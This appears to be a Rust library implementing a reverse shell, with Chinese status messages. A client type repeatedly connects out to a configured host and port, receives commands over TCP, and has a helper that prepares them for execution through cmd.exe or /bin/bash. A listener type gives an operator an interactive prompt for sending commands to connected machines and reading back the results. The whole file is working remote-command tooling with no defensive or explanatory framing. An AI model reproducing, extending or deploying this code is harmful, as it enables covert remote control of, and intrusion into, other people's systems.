use std::net::{TcpStream, SocketAddr, TcpListener, Shutdown};
use std::io::{Read, Write, Error, ErrorKind};
use std::str::FromStr;
use std::process::Command;
use serde::{Serialize, Deserialize};


pub struct CShell(String, u16);
pub struct RShell(TcpListener);
pub struct CRemote(TcpStream, bool);
pub struct SRemote(TcpStream, bool);


#[derive(Serialize, Deserialize, Debug)]
pub struct RCommand(usize, Vec<u8>);


pub trait CommandReader{
    fn read_command(&mut self)->  Option<String>;
}

pub trait CommandWrite{
    fn write_command(&mut self, command: String) -> Option<String>;
}

impl RCommand{
    pub fn serialize(&self) -> Vec<u8> {
       bincode::serialize(self).expect("无法序列化")
    }

    pub fn deserialize(bytes: &Vec<u8>) -> RCommand {
        bincode::deserialize::<RCommand>(bytes.as_slice()).expect("反序列化失败")
    }
}


impl CRemote{
    pub fn is_live(&self)->bool{
        self.1
    }

    pub fn write_result(&mut self, res: Vec<u8>){
        let res = RCommand(res.len(), res).serialize();
        if let Err(_e) = self.0.write(res.as_slice()) {
           self.1 = false;
        }
    }

    #[allow(unused_must_use)]
    pub fn exit(&mut self){
        self.0.shutdown(Shutdown::Both);
        self.1 = false;
    }
}


impl SRemote{
    pub fn is_live(&self)->bool{
        self.1
    }
}

impl Iterator for CShell {
    type Item = CRemote;

    fn next(&mut self) -> Option<Self::Item> {
        loop {
            if let Ok(connect) = TcpStream::connect(SocketAddr::from_str(format!("{}:{}", self.0, self.1).as_str()).unwrap()){
                return Option::from(CRemote(connect, true));
            }
        }
    }
}

impl Iterator for RShell{
    type Item = SRemote;

    fn next(&mut self) -> Option<Self::Item> {
        println!("等待连接....");
        for r in self.0.incoming() {
            if let Ok(connect) = r{
                println!("已建立连接 {}", connect.peer_addr().unwrap());
                return Some(SRemote(connect, true))
            }
        }
        None
    }
}


impl CommandReader for CRemote{
    fn read_command(&mut self) -> Option<String> {
        loop {
            return match read_all(&mut self.0) {
                Ok(command) => {
                    let command = RCommand::deserialize(&command).1;
                    Some(String::from_utf8(command).unwrap())
                }
                Err(_e) => {
                    self.1 = false;
                    None
                }
            }
        }
    }
}

impl CommandReader for SRemote{
    fn read_command(&mut self) -> Option<String> {
        let addr = self.0.peer_addr().unwrap();
        while self.is_live() {
            print!("{}:{} $_> ", addr.ip(), addr.port());
            std::io::stdout().flush().unwrap();
            let mut command = String::new();
            match std::io::stdin().read_line(&mut command) {
                Ok(n) if n == 0 => {continue},
                Ok(_n) => {
                    let cmd = format_command(command.as_str());
                    if cmd.len() == 0 {
                        continue
                    }
                    return Some(String::from(cmd))
                }
                Err(_) => {}
            }
        }
        None
    }
}

impl CommandWrite for SRemote{
    fn write_command(&mut self, command: String) -> Option<String> {
        let command = RCommand(command.len(), Vec::from(command));
        match self.0.write(command.serialize().as_slice()) {
            Ok(_n) => {
                return match read_all(&mut self.0) {
                    Ok(buffer) => {
                        Some(String::from_utf8_lossy(RCommand::deserialize(&buffer).1.as_slice()).to_string())
                    }
                    Err(_e) => {
                        self.1 = false;
                        None
                    }
                }
            }
            Err(_) => {
                self.1 = false;
            }
        }
        None
    }
}


pub fn format_command(command: &str)->String{
    let command = command.trim_start().trim_end().replace("\n", "");
    let mut buffer = String::new();
    let mut c = 0;
    for chr in command.chars(){
        if chr == ' ' {
            c += 1;
            continue
        }

        if c > 1 || c == 1{
            buffer.push(' ');
            c = 0;
        }
        buffer.push(chr);
    }

    buffer
}


fn read_all(reader: &mut dyn Read)->Result<Vec<u8>, std::io::Error>{
    let mut buffer = vec![0; 1024];
    let mut bytes = 0;
    loop {
        match reader.read(&mut buffer[bytes..]) {
            Ok(n) if n == 0 => {
                return Err(Error::new(ErrorKind::ConnectionReset, "连接被关闭"));
            },
            Ok(n) if n < 1024 =>{
                bytes += n;
                return Ok(buffer[..bytes].to_vec())
            }
            Ok(n) => {
                bytes += n;
                buffer.resize(bytes + 1024, 0)
            }
            Err(e) => {
                return Err(e)
            }
        }
    }
}


pub fn build_command()->Command{
    if cfg!(windows) {
        let mut cmd = Command::new("cmd.exe");
        cmd.arg("/c");
        cmd
    }else{
        let mut cmd = Command::new("/bin/bash");
        cmd.arg("-c");
        cmd
    }
}


pub fn listen(addr: &str, port:u16) -> std::io::Result<RShell> {
    TcpListener::bind(SocketAddr::from_str(format!("{}:{}", addr, port).as_str()).unwrap()).and_then(|tcp|{
        return Ok(RShell(tcp))
    })
}

pub fn shell(addr: &str, port: u16) ->CShell{
    CShell(String::from(addr), port)
}